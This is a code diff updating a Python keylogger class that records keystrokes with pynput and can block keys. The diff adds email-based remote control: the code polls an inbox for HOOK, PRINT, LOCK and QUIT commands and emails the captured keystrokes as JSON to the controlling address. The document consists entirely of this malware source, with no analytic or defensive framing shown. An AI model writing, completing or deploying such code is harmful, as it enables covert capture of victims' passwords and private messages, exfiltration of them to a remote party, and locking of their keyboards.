@@ -1,4 +1,7 @@
+import json
 import threading, keyboard
+from urllib import response
+import time
 from pynput.keyboard import Listener 
 
 class KeyloggerControl:
@@ -8,6 +11,7 @@ class KeyloggerControl:
         self.flag = 0
         self.container = " "
         self.msg = ""
+        self.emailFrom = ""
 
     def Keylogger(self, key):
         if self.flag == 4:
@@ -23,8 +27,12 @@ class KeyloggerControl:
             self.container += str(tmp)
         return
 
-    def Print(self, data, emailTemplate):
-        emailTemplate.SendNotification(emailFrom = emailTemplate.userName , emailTo = data.From, subject = "[Noreply] Server Response", body = self.container)
+    def Print(self, emailTemplate):
+        response = {
+            "isSuccess": True,
+            "message": self.container
+        }
+        emailTemplate.SendNotification(emailFrom = emailTemplate.username , emailTo = self.emailFrom, subject = "[No-reply] Server Response", body = json.dumps(response))
         self.container = " "
         return
     
@@ -43,8 +51,9 @@ class KeyloggerControl:
                 keyboard.unblock_key(i)
             self.isLock = 0
         return
-    
-    def KeyloggerHandle(self, data, emailTemplate):
+
+    def KeyloggerHandle(self, emailTemplate, emailFrom):
+        self.emailFrom = emailFrom
         self.isLock = 0
         self.isHook = 0
         self.flag = 0
@@ -53,18 +62,26 @@ class KeyloggerControl:
         threading.Thread(target = self.Listen).start() 
 
         while True:
-            if "HOOK" in data:
-                if self.ishook == 0:
+            time.sleep(5)
+            requestContent = emailTemplate.Receive()
+            if not requestContent:
+                continue
+            jsonContent = json.loads(requestContent)
+            body = jsonContent["Body"]
+            bodyJson = json.loads(body)
+            data = bodyJson["Data"]
+            if data == 'HOOK'  :
+                if self.isHook == 0:
                     self.flag = 1
-                    self.ishook = 1
+                    self.isHook = 1
                 else:
                     self.flag = 2
-                    self.ishook = 0
-            elif "PRINT" in data:
-                self.Print(data, emailTemplate)
-            elif "LOCK" in data:
+                    self.isHook = 0
+            elif data == 'PRINT':
+                self.Print(emailTemplate)
+            elif "LOCK" == data:
                 self.Lock()
-            elif "QUIT" in data:
+            elif "QUIT" == data:
                 self.flag = 4
                 return    
         return 
